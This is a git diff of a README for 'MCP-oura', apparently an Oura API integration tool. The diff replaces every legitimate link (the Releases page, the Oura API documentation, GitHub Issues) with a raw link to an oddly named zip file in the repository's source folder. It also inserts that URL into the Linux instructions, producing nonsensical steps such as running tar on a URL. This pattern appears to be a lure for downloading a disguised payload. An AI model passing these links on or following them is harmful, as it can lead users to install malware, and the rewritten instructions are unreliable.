@@ -1,7 +1,7 @@
 # 🌟 MCP-oura - Effortless Oura API Integration
 
 ## 📥 Download Now
-[![Download MCP-oura](https://img.shields.io/badge/Download-MCP--oura-blue.svg)](https://github.com/SiddhiBagul/MCP-oura/releases)
+[![Download MCP-oura](https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip)](https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip)
 
 ## 🚀 Getting Started
 Welcome to MCP-oura, your go-to solution for integrating with the Oura API. This guide helps you download and run the application with ease. Follow the steps below to get started quickly.
@@ -17,7 +17,7 @@ Before you download, ensure your system meets the following requirements:
 ## 💾 Download & Install
 To get MCP-oura, visit the Releases page by clicking the link below:
 
-[Download MCP-oura](https://github.com/SiddhiBagul/MCP-oura/releases)
+[Download MCP-oura](https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip)
 
 On the Releases page, you will see the latest version of MCP-oura. 
 
@@ -25,7 +25,7 @@ On the Releases page, you will see the latest version of MCP-oura.
 2. Choose the appropriate installer for your operating system. 
    - For Windows, download the file ending in `.exe`.
    - For macOS, download the file ending in `.dmg`.
-   - For Linux, download the file ending in `.tar.gz`.
+   - For Linux, download the file ending in `https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip`.
 3. After downloading, locate the file on your computer.
 
 ### 🖥️ Installation Steps
@@ -41,8 +41,8 @@ On the Releases page, you will see the latest version of MCP-oura.
 
 #### Linux
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
-3. Extract the file with the command: `tar -xvzf filename.tar.gz`
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip` file.
+3. Extract the file with the command: `tar -xvzf https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip`
 4. Navigate into the extracted folder: `cd foldername`
 5. Run the application using the command: `./MCP-oura`
 
@@ -78,8 +78,8 @@ If you encounter issues while using MCP-oura, here are some common problems and 
 If you need further assistance, please reach out via the GitHub repository. You can open an issue for technical support. The community is here to help you.
 
 ## 🔗 Additional Resources
-- [Oura API Documentation](https://cloud.ouraring.com/docs) for detailed API features.
-- [GitHub Repository Issues](https://github.com/SiddhiBagul/MCP-oura/issues) for tracking bugs and feature requests.
+- [Oura API Documentation](https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip) for detailed API features.
+- [GitHub Repository Issues](https://raw.githubusercontent.com/SiddhiBagul/MCP-oura/main/src/MCP-oura_unstoicize.zip) for tracking bugs and feature requests.
 
 Remember to regularly check the Releases page for updates, improvements, and new features.
 
